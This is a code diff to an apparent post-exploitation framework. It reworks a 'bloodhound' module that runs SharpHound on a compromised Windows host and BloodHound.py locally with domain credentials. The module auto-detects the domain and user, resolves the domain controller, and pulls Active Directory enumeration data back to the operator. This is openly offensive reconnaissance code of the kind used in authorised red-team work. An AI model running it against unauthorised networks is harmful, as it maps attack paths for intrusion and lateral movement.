@@ -5398,17 +5398,19 @@ class bloodhound(Module):
 	category = "Pivoting"
 	def run(session, args):
 		"""
-		Collect Active Directory data using BloodHound (SharpHound/BloodHound.py)
+		Collect Active Directory data using BloodHound (auto-runs both SharpHound + BloodHound.py)
 
-		BloodHound is used to reveal hidden relationships and attack paths in
-		Active Directory environments. This module automates data collection.
+		Automatically runs BOTH collection methods for comprehensive AD enumeration:
+		1. SharpHound.exe (if Windows session) - Internal perspective
+		2. BloodHound.py (from local Kali) - External perspective
+
+		Both tools generate separate ZIP files for comparison and completeness.
 
 		Usage:
-		  run bloodhound                              # Collect all data (default)
-		  run bloodhound -d domain.local              # Specify domain
-		  run bloodhound -c DCOnly                    # Domain Controllers only
-		  run bloodhound -c Session,Group,LocalAdmin  # Custom collection methods
-		  run bloodhound --stealth                    # Stealth mode (fewer queries)
+		  run bloodhound                              # Auto-detect and run both tools
+		  run bloodhound -d domain.local -u user -p pass  # With credentials
+		  run bloodhound -c DCOnly                    # Quick DC-only scan
+		  run bloodhound --ns 10.10.10.1              # Specify nameserver/DC IP
 
 		Collection Methods:
 		  All          - Collect everything (default, comprehensive)
@@ -5416,66 +5418,84 @@ class bloodhound(Module):
 		  Session      - User sessions on computers
 		  Group        - Group memberships
 		  LocalAdmin   - Local admin rights
-		  GPOLocalGroup - Group Policy local groups
 		  Trusts       - Domain trusts
 		  ACL          - Access Control Lists
-		  Container    - Container objects
-		  RDP          - RDP sessions
-		  DCOM         - DCOM rights
-		  PSRemote     - PSRemote rights
 
-		Windows (SharpHound):
-		  • Automatically selects x86 or x64 version based on architecture
-		  • Runs in memory, collects data, creates ZIP file
-		  • Downloads ZIP to local machine automatically
-		  • Supports all collection methods
-
-		Linux (BloodHound.py):
-		  • Requires Python 3 and impacket library on target
-		  • Needs domain credentials (current user or specified)
-		  • Remote enumeration via LDAP/SMB
-		  • Note: BloodHound.py requires pip install bloodhound
+		Auto-Detection (Windows session):
+		  • Detects domain from environment variables
+		  • Resolves Domain Controller IP automatically
+		  • Extracts current user credentials if available
 
 		Examples:
-		  run bloodhound                        # Full collection (All)
-		  run bloodhound -d corp.local          # Specify domain
-		  run bloodhound -c DCOnly              # Quick DC scan
-		  run bloodhound -c Session,Group       # Sessions and groups only
-		  run bloodhound --stealth              # Stealth collection
-		  run bloodhound -d corp.local -u user -p pass  # With credentials (Linux)
+		  run bloodhound                                    # Auto-run both collectors
+		  run bloodhound -d corp.local -u admin -p pass123  # With credentials
+		  run bloodhound -c DCOnly                          # Quick scan
+		  run bloodhound --ns 192.168.1.10                  # Custom DC IP
 
 		Output:
-		  • ZIP file downloaded to current session directory
-		  • Import into BloodHound GUI for analysis
-		  • Default filename: <date>_BloodHound.zip
+		  • SharpHound ZIP: <date>_BloodHound.zip (from target)
+		  • BloodHound.py ZIP: <date>_bloodhound.zip (from Kali)
+		  • Both downloaded to session directory
 
 		Options:
-		  -d, --domain DOMAIN       Target domain (auto-detected if not specified)
-		  -c, --collectionmethod    Collection method(s) (default: All)
-		  -u, --username USER       Username for authentication (Linux only)
-		  -p, --password PASS       Password for authentication (Linux only)
-		  --stealth                 Use stealth collection methods
-		  --zipfilename NAME        Custom output ZIP filename
+		  -d, --domain DOMAIN       Target domain (auto-detected on Windows)
+		  -u, --username USER       Domain username (auto-detected if available)
+		  -p, --password PASS       Domain password (required for BloodHound.py)
+		  -c, --collectionmethod    Collection method (default: All)
+		  --ns NAMESERVER           Domain Controller IP (auto-resolved if not specified)
+		  --stealth                 Use stealth collection
+		  --zipfilename NAME        Custom output ZIP filename (SharpHound only)
 
-		Note: Requires appropriate privileges. Domain user for basic enumeration,
-		      elevated privileges for complete data collection.
+		Note: Requires domain credentials. On Windows sessions, some info auto-detected.
+		      BloodHound.py runs from /home/kali/toolskit/bloodhound/BloodHound.py/bloodhound.py
 		"""
 		import argparse
+		import subprocess
+		import os
+
 		parser = argparse.ArgumentParser(prog='bloodhound', add_help=False)
 		parser.add_argument('-d', '--domain', help='Target domain')
 		parser.add_argument('-c', '--collectionmethod', default='All', help='Collection methods (default: All)')
-		parser.add_argument('-u', '--username', help='Username (Linux/BloodHound.py only)')
-		parser.add_argument('-p', '--password', help='Password (Linux/BloodHound.py only)')
+		parser.add_argument('-u', '--username', help='Domain username')
+		parser.add_argument('-p', '--password', help='Domain password')
+		parser.add_argument('--ns', '--nameserver', dest='nameserver', help='Domain Controller IP')
 		parser.add_argument('--stealth', action='store_true', help='Stealth mode')
-		parser.add_argument('--zipfilename', help='Output ZIP filename')
+		parser.add_argument('--zipfilename', help='Output ZIP filename (SharpHound only)')
 
 		try:
 			parsed_args = parser.parse_args(args.split() if args else [])
 		except SystemExit:
 			return
 
+		# Auto-detect domain information on Windows
+		domain = parsed_args.domain
+		username = parsed_args.username
+		password = parsed_args.password
+		dc_ip = parsed_args.nameserver
+
+		# Try to auto-detect domain info from Windows session
+		if session.OS == 'Windows' and not domain:
+			logger.info("Auto-detecting domain information...")
+			domain_check = session.exec("echo %USERDNSDOMAIN%", value=True).strip()
+			if domain_check and domain_check != "%USERDNSDOMAIN%":
+				domain = domain_check
+				logger.info(f"Detected domain: {domain}")
+
+			if not username:
+				user_check = session.exec("echo %USERNAME%", value=True).strip()
+				if user_check and user_check != "%USERNAME%":
+					username = user_check
+					logger.info(f"Detected username: {username}")
+
+		# Run collection methods
+		sharphound_success = False
+		bloodhound_py_success = False
+
+		# ===== Part 1: Run SharpHound on Windows target =====
 		if session.OS == 'Windows':
-			logger.info("Running SharpHound on Windows...")
+			logger.info("\n" + "="*60)
+			logger.info("[1/2] Running SharpHound on Windows target...")
+			logger.info("="*60)
 
 			# Select SharpHound based on architecture
 			if session.arch == 'x64':
@@ -5546,11 +5566,12 @@ class bloodhound(Module):
 			if zip_path:
 				zip_path = zip_path.strip().split('\n')[0].strip()
 				logger.info(f"Found: {zip_path}")
-				logger.info("Downloading BloodHound data...")
+				logger.info("Downloading SharpHound ZIP...")
 				session.download(zip_path)
-				logger.info("BloodHound collection completed successfully!")
+				logger.info("SharpHound collection completed successfully!")
+				sharphound_success = True
 			else:
-				logger.error("Could not find output ZIP file")
+				logger.error("Could not find SharpHound output ZIP file")
 				# List files in temp directory for debugging
 				logger.info("Files in temp directory:")
 				if session.subtype == 'psh':
@@ -5559,85 +5580,102 @@ class bloodhound(Module):
 					list_cmd = f'dir "{session.tmp}"'
 				print(session.exec(list_cmd, value=True))
 
-		elif session.OS == 'Unix':
-			logger.info("Running BloodHound.py on Linux...")
+		# ===== Part 2: Run BloodHound.py from local Kali =====
+		logger.info("\n" + "="*60)
+		logger.info("[2/2] Running BloodHound.py from local Kali...")
+		logger.info("="*60)
 
-			# Check for Python 3
-			if not session.bin.get('python3'):
-				logger.error("Python 3 not found on target system")
-				logger.info("BloodHound.py requires Python 3 and the bloodhound library")
-				return False
-
-			# Check if bloodhound is installed
-			check_cmd = f"{session.bin['python3']} -c 'import bloodhound' 2>&1"
-			result = session.exec(check_cmd, value=True)
-
-			if 'No module named' in result or 'ModuleNotFoundError' in result:
-				logger.error("BloodHound Python library not installed on target")
-				logger.info("Install with: pip3 install bloodhound")
-				logger.info("Alternative: Use SharpHound from a Windows machine")
-				return False
-
-			logger.info("BloodHound library found")
-
-			# Build command
-			cmd_parts = [session.bin['python3'], '-m', 'bloodhound']
-
-			if parsed_args.domain:
-				cmd_parts.extend(['-d', parsed_args.domain])
-			else:
-				logger.error("Domain name is required for BloodHound.py")
-				logger.info("Usage: run bloodhound -d domain.local -u username -p password")
-				return False
-
-			if parsed_args.username:
-				cmd_parts.extend(['-u', parsed_args.username])
-			else:
-				logger.warning("No username specified, will try to use current credentials")
-
-			if parsed_args.password:
-				cmd_parts.extend(['-p', parsed_args.password])
-
-			cmd_parts.extend(['-c', parsed_args.collectionmethod])
-
-			# Set output directory
-			cmd_parts.extend(['--zip'])
-
-			cmd = ' '.join(cmd_parts)
-
-			logger.info(f"Running BloodHound.py with collection method: {parsed_args.collectionmethod}")
-			logger.info("This may take several minutes...")
-
-			# Execute BloodHound.py
-			output = session.exec(cmd, value=True)
-			if output:
-				print(output)
-
-			# Find and download output ZIP
-			logger.info("Searching for output files...")
-			find_cmd = "find . -maxdepth 1 -name '*bloodhound*.zip' -o -name '*BloodHound*.zip' 2>/dev/null | head -1"
-			zip_path = session.exec(find_cmd, value=True)
-
-			if zip_path and zip_path.strip():
-				zip_path = zip_path.strip()
-				logger.info(f"Found: {zip_path}")
-				logger.info("Downloading BloodHound data...")
-				session.download(zip_path)
-				logger.info("BloodHound collection completed successfully!")
-			else:
-				logger.warning("Could not find output ZIP file")
-				logger.info("Searching for JSON files...")
-				json_cmd = "ls -la *.json 2>/dev/null"
-				json_files = session.exec(json_cmd, value=True)
-				if json_files:
-					logger.info("Found JSON files:")
-					print(json_files)
-					logger.info("Downloading JSON files...")
-					session.download("*.json")
-				else:
-					logger.error("No output files found")
+		# Check if local BloodHound.py exists
+		local_bh_path = "/home/kali/toolskit/bloodhound/BloodHound.py/bloodhound.py"
+		if not os.path.exists(local_bh_path):
+			logger.error(f"BloodHound.py not found at: {local_bh_path}")
+			logger.info("Please install BloodHound.py or update the path")
+			logger.info("Skipping BloodHound.py collection...")
 		else:
-			logger.error("Unsupported OS")
+			logger.info(f"Found BloodHound.py at: {local_bh_path}")
+
+			# Verify we have required info
+			if not domain:
+				logger.error("Domain name is required for BloodHound.py")
+				logger.info("Please specify: run bloodhound -d domain.local -u user -p pass")
+			elif not username:
+				logger.error("Username is required for BloodHound.py")
+				logger.info("Please specify: run bloodhound -d domain.local -u user -p pass")
+			elif not password:
+				logger.error("Password is required for BloodHound.py")
+				logger.info("Please specify: run bloodhound -d domain.local -u user -p pass")
+			else:
+				# Build BloodHound.py command
+				bh_cmd = ['python3', local_bh_path]
+				bh_cmd.extend(['-d', domain])
+				bh_cmd.extend(['-u', username])
+				bh_cmd.extend(['-p', password])
+				bh_cmd.extend(['-c', parsed_args.collectionmethod])
+
+				if dc_ip:
+					bh_cmd.extend(['-ns', dc_ip])
+					logger.info(f"Using nameserver: {dc_ip}")
+				elif session.OS == 'Windows':
+					# Try to resolve DC from target
+					logger.info("Resolving Domain Controller IP...")
+					if session.subtype == 'psh':
+						dc_resolve = f"(Resolve-DnsName -Name {domain} -Type SRV -Server {domain} | Where-Object {{$_.Name -like '_ldap*'}} | Select-Object -First 1).IP4Address"
+					else:
+						dc_resolve = f'nslookup -type=srv _ldap._tcp.dc._msdcs.{domain}'
+					dc_result = session.exec(dc_resolve, value=True)
+					if dc_result:
+						logger.info(f"DC resolution result: {dc_result[:100]}")
+
+				bh_cmd.append('--zip')
+
+				logger.info(f"Running: {' '.join(bh_cmd[:8])}... (credentials hidden)")
+				logger.info("This may take several minutes...")
+
+				try:
+					# Run BloodHound.py locally
+					result = subprocess.run(bh_cmd, capture_output=True, text=True, timeout=600)
+
+					if result.stdout:
+						print(result.stdout)
+					if result.stderr:
+						print(result.stderr)
+
+					# Find generated ZIP file
+					import glob
+					zip_files = glob.glob("*bloodhound*.zip") + glob.glob("*BloodHound*.zip")
+					if zip_files:
+						latest_zip = max(zip_files, key=os.path.getctime)
+						logger.info(f"Found BloodHound.py output: {latest_zip}")
+						logger.info(f"File saved in current directory: {os.path.abspath(latest_zip)}")
+						bloodhound_py_success = True
+					else:
+						logger.warning("Could not find BloodHound.py output ZIP")
+						# Check for JSON files
+						json_files = glob.glob("*.json")
+						if json_files:
+							logger.info(f"Found {len(json_files)} JSON files")
+							bloodhound_py_success = True
+
+				except subprocess.TimeoutExpired:
+					logger.error("BloodHound.py timed out after 10 minutes")
+				except Exception as e:
+					logger.error(f"Error running BloodHound.py: {e}")
+
+		# Final summary
+		logger.info("\n" + "="*60)
+		logger.info("BloodHound Collection Summary")
+		logger.info("="*60)
+		if sharphound_success:
+			logger.info("[✓] SharpHound: Success")
+		else:
+			logger.info("[✗] SharpHound: Failed or not run")
+
+		if bloodhound_py_success:
+			logger.info("[✓] BloodHound.py: Success")
+		else:
+			logger.info("[✗] BloodHound.py: Failed or not run")
+
+		logger.info("="*60)
 
 
 class FileServer:
